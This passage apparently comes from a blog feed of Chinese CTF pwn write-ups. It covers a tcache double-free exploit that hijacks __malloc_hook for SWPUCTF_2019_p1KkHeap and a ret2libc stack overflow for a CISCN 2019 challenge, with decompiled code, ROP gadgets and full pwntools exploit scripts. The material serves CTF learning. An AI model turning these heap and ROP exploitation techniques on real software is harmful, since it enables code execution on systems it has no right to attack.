class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##å‚è€ƒé“¾æ¥<br>
<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF pwn åˆ·é¢˜è®°å½•(æŒç»­æ›´æ–°)</title>
    <url>/2021/10/04/NSSCTF%20pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/29.jpg" alt="pic"></p>
<span id="more"></span>
<p>è¿™æ˜¯ä¸€ä¸ªè®°å½•åœ¨NSSCTFå¹³å°ä¸Šåˆ·pwné¢˜çš„åšå®¢ï¼Œé¢˜ç›®é¡ºåºæŒ‰ç…§åˆ·é¢˜çš„å…ˆåé¡ºåº</p>
<h2 id="SWPUCTF-2019-p1KkHeap"><a class="header-anchor" href="#SWPUCTF-2019-p1KkHeap">Â¶</a>SWPUCTF_2019_p1KkHeap</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.tacahe bin attact
2.unsorted bin attact
3.malloc hook
</code></pre>
<h3 id="å‡½æ•°"><a class="header-anchor" href="#å‡½æ•°">Â¶</a>å‡½æ•°</h3>
<p>main å…¶ä¸­çš„å„ç§åŠŸèƒ½åªèƒ½è°ƒç”¨18æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  int v4; // eax</span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = &quot;                           Welcome to SWPUCTF 2019&quot;;</span><br><span class="line">  puts(&quot;                           Welcome to SWPUCTF 2019&quot;);</span><br><span class="line">  while ( dword_202024 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10C5();</span><br><span class="line">    v4 = sub_1076(v3, a2);</span><br><span class="line">    if ( v4 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_EC1();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 == 5 )</span><br><span class="line">        ((void (*)(void))sub_E04)();</span><br><span class="line">      if ( v4 &lt; 5 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_FD1();</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 == 666 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &quot;p1Kk wants a boyfriend!&quot;;</span><br><span class="line">        puts(&quot;p1Kk wants a boyfriend!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_E1E();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_F58();</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;                             // 18</span><br><span class="line">  &#125;</span><br><span class="line">  sub_E04(v3, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_BA0  å®Œæˆåˆå§‹åŒ–ä»¥åŠæ²™ç›’,é€šè¿‡seccomp-toolså¾—çŸ¥ç¦ç”¨äº†one_gadgetç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setbuf(stdin, 0LL);</span><br><span class="line">setbuf(stdout, 0LL);</span><br><span class="line">setbuf(stderr, 0LL);</span><br><span class="line">fd = open(&quot;./logo&quot;, 4);</span><br><span class="line">read(fd, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, asc_202040, 0x52uLL);</span><br><span class="line">close(fd);</span><br><span class="line">if ( mmap((void *)0x66660000, 0x1000uLL, 7, 34, -1, 0LL) != (void *)1717960704 )// åœ¨0x66660000å¤„æ˜ å°„äº†0x1000å¤§å°çš„å†…å­˜</span><br><span class="line">  exit(-1);</span><br><span class="line">memset((void *)0x66660000, 0, 0x1000uLL);</span><br><span class="line">strcpy((char *)0x66660000, &quot;SWPUCTF_p1Kk&quot;);</span><br><span class="line">prctl(38, 1LL, 0LL, 0LL, 0LL);                // æ²™ç®±ç¦ç”¨</span><br></pre></td></tr></table></figure>
<p>add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_E1E(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  if ( size &gt; 0x100 )                           // æœ€å¤§ç”³è¯·0x100</span><br><span class="line">    sub_E04(&quot;size: &quot;, a2);</span><br><span class="line">  v3 = sub_DA9();</span><br><span class="line">  if ( v3 &lt;= 7 )                                // æœ€å¤šç”³è¯·7ä¸ª</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v3] = malloc(size);</span><br><span class="line">    dword_2020E0[v3] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delete</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_FD1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( dword_202020 &lt;= 0 )</span><br><span class="line">    sub_E04(a1, a2);</span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  free((void *)qword_202100[v3]);</span><br><span class="line">  dword_2020E0[v3] = 0;                         // è¿™é‡ŒåªæŠŠå¤§å°æ¸…é›¶ï¼Œå´æ²¡æŠŠæŒ‡é’ˆæ¸…é›¶ å­˜åœ¨UAF</span><br><span class="line">  --dword_202020;                               // dword_202020=3ï¼Œåªèƒ½freeä¸‰æ¬¡</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_F58(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  puts((const char *)qword_202100[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_EC1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  read(0, *((void **)&amp;qword_202100 + v3), dword_2020E0[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ”»å‡»æ€è·¯"><a class="header-anchor" href="#æ”»å‡»æ€è·¯">Â¶</a>æ”»å‡»æ€è·¯</h3>
<p>è¿™é‡Œæ˜¯è½¬è‡ªæ˜Ÿç›Ÿçš„ha1vkå¸ˆå‚…çš„æ”»å‡»æ€è·¯</p>
<p>æˆ‘ä»¬è¯¥å¦‚ä½•è§¦å‘shellcodeæˆ–ROPï¼Œåœ¨è¿™ï¼Œæˆ‘ä»¬å¯ä»¥æ”»å‡»__malloc_hookï¼Œå°†shellcodeçš„åœ°å€å†™å…¥åˆ°__malloc_hookï¼Œåœ¨è¿™é‡Œï¼ŒROPæ˜¾ç„¶å¾ˆéº»çƒ¦ï¼Œå› ä¸ºROPè¿˜è¦åšæ ˆè½¬ç§»ï¼Œå¹¶ä¸”éœ€è¦å…ˆå‰ä¾é ä¸€æ®µshellcodeæ¥è½¬ç§»æ ˆï¼Œå¦‚æœä¾›æˆ‘ä»¬å­˜æ”¾shellcodeçš„åœ°æ–¹ç©ºé—´å¾ˆå°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å†™ä¸€æ®µç®€çŸ­çš„shellcodeï¼Œå°†æ ˆè½¬ç§»ï¼Œä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥æ”¾shellcodeï¼Œé‚£ä¹ˆï¼Œç›´æ¥æŠŠè¯»å–å’Œè¾“å‡ºflagçš„shellcodeå†™åˆ°é‚£ä¸ªç©ºé—´ã€‚</p>
<p>å¯¹äºå¯å†™shellcodeçš„ç©ºé—´å¾ˆå°ï¼Œæˆ‘è¿˜æƒ³åˆ°äº†å¦å¤–ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯å†™ä¸€æ®µç®€çŸ­çš„shellcodeï¼Œæ¥è°ƒç”¨int mprotect(const void *start, size_t len, int prot)å‡½æ•°ï¼Œå°†æŸåœ°å€å¤„å±æ€§ä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæŸä¸ªå †ä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼Œé‚£ä¹ˆå°±èƒ½åœ¨å †é‡Œå¸ƒä¸‹shellcodeã€‚</p>
<p>ç¨‹åºåœ¨0x66660000è¿™ä¸ªå›ºå®šçš„åœ°å€å¤„æ˜ å°„äº†0x1000å¤§å°çš„ç©ºé—´ï¼Œå¹¶ä¸”å±æ€§ä¸ºRWXï¼Œæ—¢å¯è¯»å†™ï¼Œä¹Ÿå…·æœ‰æ‰§è¡Œå±æ€§ï¼Œå¹¶ä¸”åœ°å€å›ºå®šä¸º0x66660000ï¼Œä½¿å¾—æˆ‘ä»¬æ›´åŠ æ–¹ä¾¿ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å†³å®šæŠŠshellcodeå†™åˆ°0x66660000å¤„ï¼Œç„¶åæ”»å‡»malloc_hook,åœ¨malloc_hookå¤„å†™å…¥0x66660000ï¼Œè¿™æ ·ï¼Œå½“æˆ‘ä»¬å†æ¬¡mallocæ—¶ï¼Œå°±ä¼šæ‰§è¡Œshellcodeã€‚</p>
<p>é¦–å…ˆï¼Œéœ€è¦æ³„éœ²ä¸€äº›åœ°å€ï¼Œé‚£ä¹ˆéœ€è¦ç”¨åˆ°unsorted binï¼Œä½†æ˜¯ï¼Œç”±äºtcacheçš„å­˜åœ¨ï¼Œå¯¹åº”çš„tcache binæ»¡7ä¸ªï¼Œæ¥ä¸‹æ¥çš„å †å—æ‰ä¼šæ”¾å…¥unsorted binã€‚æ»¡7ä¸ªï¼Œå°±å¿…é¡»delete 7æ¬¡ï¼Œæœ¬é¢˜æœ€å¤šåªèƒ½ç”¨3æ¬¡ï¼Œæ˜¾ç„¶è¿™ä¸ªæ–¹æ¡ˆä¸å¯è¡Œã€‚</p>
<p>ä¸‹é¢æ˜¯tcacheçš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_par  </span><br><span class="line">&#123;  </span><br><span class="line">  /* Tunable parameters */  </span><br><span class="line">  unsigned long trim_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T top_pad;  </span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T arena_test;  </span><br><span class="line">  INTERNAL_SIZE_T arena_max;  </span><br><span class="line">  </span><br><span class="line">  /* Memory map support */  </span><br><span class="line">  int n_mmaps;  </span><br><span class="line">  int n_mmaps_max;  </span><br><span class="line">  int max_n_mmaps;  </span><br><span class="line">  /* the mmap_threshold is dynamic, until the user sets </span><br><span class="line">     it manually, at which point we need to disable any </span><br><span class="line">     dynamic behavior. */  </span><br><span class="line">  int no_dyn_threshold;  </span><br><span class="line">  </span><br><span class="line">  /* Statistics */  </span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  </span><br><span class="line">  </span><br><span class="line">  /* First address handed out by MORECORE/sbrk.  */  </span><br><span class="line">  char *sbrk_base;  </span><br><span class="line">  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  /* Maximum number of buckets to use.  */  </span><br><span class="line">  size_t tcache_bins;  </span><br><span class="line">  size_t tcache_max_bytes;  </span><br><span class="line">  /* Maximum number of chunks in each bucket.  */  </span><br><span class="line">  size_t tcache_count;  </span><br><span class="line">  /* Maximum number of chunks to remove from the unsorted list, which </span><br><span class="line">     aren&#x27;t used to prefill the cache.  */  </span><br><span class="line">  size_t tcache_unsorted_limit;  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">static struct malloc_par mp_ =  </span><br><span class="line">&#123;  </span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,  </span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,  </span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  </span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  </span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (1)  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  ,  </span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,  </span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,  </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  </span><br><span class="line">  .tcache_unsorted_limit = 0 /* No limit.  */  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼Œsize_t tcache_bins;æ˜¯æ— ç¬¦å·çš„ï¼Œä½†æ˜¯ tcache-&gt;counts[tc_idx]æ˜¯æœ‰ç¬¦å·æ•°ç»„</p>
<p>å½“ä¸€ä¸ªæœ‰ç¬¦å·æ•°å’Œä¸€ä¸ªæ— ç¬¦å·æ•°è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œæœ‰ç¬¦å·æ•°ä¼šå…ˆè½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œç„¶åå†è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>é‚£ä¹ˆï¼Œå‡è®¾ï¼Œæˆ‘ä»¬double freeåŒä¸€ä¸ªå †ï¼Œé‚£ä¹ˆåœ¨tcache biné‡Œå°±ä¼šæ„æˆå¾ªç¯é“¾è¡¨ï¼Œæ­¤æ—¶count=2ï¼Œç„¶åï¼Œæˆ‘ä»¬å†create 3ä¸ªä¸€æ ·å¤§å°çš„å †ï¼Œé‚£ä¹ˆcountå°±å˜æˆäº†-1,æ­¤æ—¶ï¼Œæˆ‘ä»¬å†deleteä¸€ä¸ªunsorted binèŒƒå›´çš„å †ï¼Œè¿™ä¸ªå †å°±ä¼šæ”¾å…¥unsorted binï¼Œç„¶åæˆ‘ä»¬ç”¨showåŠŸèƒ½å°±èƒ½æ³„éœ²å‡ºlibcä¸­çš„æŒ‡é’ˆã€‚</p>
<p>ä½†æ˜¯è¯¥ç¨‹åºåªèƒ½free3æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¸€æ¬¡æ”»å‡»ï¼Œç›´æ¥å»æ”»å‡»tcache binçš„è¡¨å¤´ï¼Œé‚£ä¹ˆï¼Œä¸‹æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥ä¿®æ”¹è¡¨å¤´ï¼Œæ¥å†³å®šä¸‹ä¸€æ¬¡å †åˆ†é…åˆ°å“ªä¸ªåœ°æ–¹ã€‚</p>
<h3 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#tcache_dup</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#1_chunk get tcache_entry</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">first_chunk=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">tcache_entry=first_chunk-<span class="number">0x198</span>-<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_entry))</span><br><span class="line"><span class="comment">#edit fd -&gt; tache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tcache_entry))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 get tcache_entry</span></span><br><span class="line">rwx_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,p64(rwx_add))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5 get rwx memory</span></span><br><span class="line"><span class="comment">#write shellcode</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"><span class="comment">#tcache_count is -1(0xff) now</span></span><br><span class="line"><span class="comment">#unsortbin attack</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#malloc_hijack</span></span><br><span class="line">malloc_hook=libc_base+<span class="number">0x3ebc30</span></span><br><span class="line">edit(<span class="number">4</span>,p64(malloc_hook))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#6 get malloc_hook</span></span><br><span class="line">edit(<span class="number">6</span>,p64(rwx_add))</span><br><span class="line"><span class="comment">#getflag</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019ä¸œåŒ—-PWN2"><a class="header-anchor" href="#CISCN-2019ä¸œåŒ—-PWN2">Â¶</a>CISCN 2019ä¸œåŒ— PWN2</h2>
<h3 id="IDAåˆ†æ"><a class="header-anchor" href="#IDAåˆ†æ">Â¶</a>IDAåˆ†æ</h3>
<p>encrypt å‡½æ•°ä¸­æœ‰ä¸ªæ ˆæº¢å‡ºï¼Œè¿™é¢˜ç›´æ¥ret2libc</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="2.png-39.5kB"></p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c82 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007f0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400aec : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b9 : ret</span></span><br><span class="line"><span class="string">0x00000000004008ca : ret 0x2017</span></span><br><span class="line"><span class="string">0x0000000000400962 : ret 0x458b</span></span><br><span class="line"><span class="string">0x00000000004009c5 : ret 0xbf02</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28015</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">pop_4 = <span class="number">0x400c7c</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	p = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">		x = <span class="built_in">chr</span>(x)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">122</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">90</span>:</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">ord</span>(x)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">57</span>:</span><br><span class="line">					x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xc</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xd</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xe</span>)</span><br><span class="line">		p += x</span><br><span class="line">	<span class="keyword">return</span>(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(encrypt(payload))</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system 